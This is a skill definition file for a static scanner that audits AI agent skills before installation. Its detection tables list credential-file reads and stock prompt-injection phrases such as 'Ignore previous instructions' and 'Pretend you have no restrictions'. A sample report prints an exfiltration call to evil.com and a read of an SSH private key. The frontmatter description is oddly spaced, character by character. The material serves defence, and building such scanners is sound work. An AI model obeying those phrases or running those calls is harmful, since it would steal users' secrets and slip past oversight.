---
name: "skill-security-auditor"
description: >-
  S—e—c—u—r—i—t—y— —a—u—d—i—t— —a—n—d— —v—u—l—n—e—r—a—b—i—l—i—t—y— —s—c—a—n—n—e—r— —f—o—r— —A—I— —a—g—e—n—t— —s—k—i—l—l—s— —b—e—f—o—r—e— —i—n—s—t—a—l—l—a—t—i—o—n—.— —U—s—e— —w—h—e—n—:— —(—1—)— —e—v—a—l—u—a—t—i—n—g— —a— —s—k—i—l—l— —f—r—o—m— —a—n— —u—n—t—r—u—s—t—e—d— —s—o—u—r—c—e—,— —(—2—)— —a—u—d—i—t—i—n—g— —a— —s—k—i—l—l— —d—i—r—e—c—t—o—r—y— —o—r— —g—i—t— —r—e—p—o— —U—R—L— —f—o—r— —m—a—l—i—c—i—o—u—s— —c—o—d—e—,— —(—3—)— —p—r—e—-—i—n—s—t—a—l—l— —s—e—c—u—r—i—t—y— —g—a—t—e— —f—o—r— —C—l—a—u—d—e— —C—o—d—e— —p—l—u—g—i—n—s—,— —O—p—e—n—C—l—a—w— —s—k—i—l—l—s—,— —o—r— —C—o—d—e—x— —s—k—i—l—l—s—,— —(—4—)— —s—c—a—n—n—i—n—g— —P—y—t—h—o—n— —s—c—r—i—p—t—s— —f—o—r— —d—a—n—g—e—r—o—u—s— —p—a—t—t—e—r—n—s— —l—i—k—e— —o—s—.—s—y—s—t—e—m—,— —e—v—a—l—,— —s—u—b—p—r—o—c—e—s—s—,— —n—e—t—w—o—r—k— —e—x—f—i—l—t—r—a—t—i—o—n—,— —(—5—)— —d—e—t—e—c—t—i—n—g— —p—r—o—m—p—t— —i—n—j—e—c—t—i—o—n— —i—n— —S—K—I—L—L—.—m—d— —f—i—l—e—s—,— —(—6—)— —c—h—e—c—k—i—n—g— —d—e—p—e—n—d—e—n—c—y— —s—u—p—p—l—y— —c—h—a—i—n— —r—i—s—k—s—,— —(—7—)— —v—e—r—i—f—y—i—n—g— —f—i—l—e— —s—y—s—t—e—m— —a—c—c—e—s—s— —s—t—a—y—s— —w—i—t—h—i—n— —s—k—i—l—l— —b—o—u—n—d—a—r—i—e—s—.— —T—r—i—g—g—e—r—s—:— —"—a—u—d—i—t— —t—h—i—s— —s—k—i—l—l—"—,— —"—i—s— —t—h—i—s— —s—k—i—l—l— —s—a—f—e—"—,— —"—s—c—a—n— —s—k—i—l—l— —f—o—r— —s—e—c—u—r—i—t—y—"—,— —"—c—h—e—c—k— —s—k—i—l—l— —b—e—f—o—r—e— —i—n—s—t—a—l—l—"—,— —"—s—k—i—l—l— —s—e—c—u—r—i—t—y— —c—h—e—c—k—"—,— —"—s—k—i—l—l— —v—u—l—n—e—r—a—b—i—l—i—t—y— —s—c—a—n—".
---

# Skill Security Auditor

Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL | <!-- noqa: SEC-AUDITOR -->

### 3. Dependency Supply Chain

For skills with `requirements.txt`, `package.json`, or inline `pip install`:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Known vulnerabilities** | Cross-reference with PyPI/npm advisory databases | 🔴 CRITICAL |
| **Typosquatting** | Flag packages similar to popular ones (e.g., `reqeusts`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` | ⚪ INFO |
| **Install commands in code** | `pip install` or `npm install` inside scripts | 🟡 HIGH |
| **Suspicious packages** | Low download count, recent creation, single maintainer | ⚪ INFO |

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa")) <!-- noqa: SEC-AUDITOR -->
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Network destination reputation checks require internet access
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency vulnerability checks use local pattern matching, not live CVE databases

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
